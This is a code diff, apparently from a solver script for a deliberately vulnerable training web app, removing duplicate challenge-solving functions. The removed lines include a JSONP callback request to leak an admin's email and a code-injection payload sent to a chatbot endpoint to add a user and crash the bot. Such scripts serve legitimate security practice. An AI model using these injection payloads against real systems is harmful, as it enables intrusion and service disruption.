@@ -181,34 +181,8 @@ def solve_blockchain_hype(server):
         print(f"Error: {e}")
 
 
-def solve_extra_language(server):
-    import requests
-    print('Accessing extra language...')
-    try:
-        res = requests.get(f'{server}/assets/i18n/tlh_AA.json', verify=False)
-        if res.ok: print(f'Success! {len(res.content)} bytes')
-    except: pass
+    # Removed duplicate function definitions
 
-def solve_email_leak(server):
-    print('Email leak via JSONP...')
-    try:
-        session = get_admin_session(server)
-        res = session.get(f'{server}/rest/user/whoami', params={'callback': 'x'})
-        if res.ok: print('Success!')
-    except: pass
-
-def solve_kill_chatbot(server):
-    print('Killing chatbot...')
-    try:
-        session = get_admin_session(server)
-        payload = 'admin"); processQuery=null; users.addUser("1337", "test'
-        update = session.post(f'{server}/rest/chatbot/respond', json={'action': 'setname', 'query': payload})
-        if update.ok:
-            session.post(f'{server}/rest/chatbot/respond', json={'action': 'query', 'query': 'hi'})
-            session.post(f'{server}/rest/chatbot/respond', json={'action': 'query', 'query': '...'})
-            chat3 = session.post(f'{server}/rest/chatbot/respond', json={'action': 'query', 'query': 'bye'})
-            if chat3.ok: print('Success! Chatbot killed')
-    except: pass
 
 def solve_extra_language(server):
     """Access Klingon translation file"""
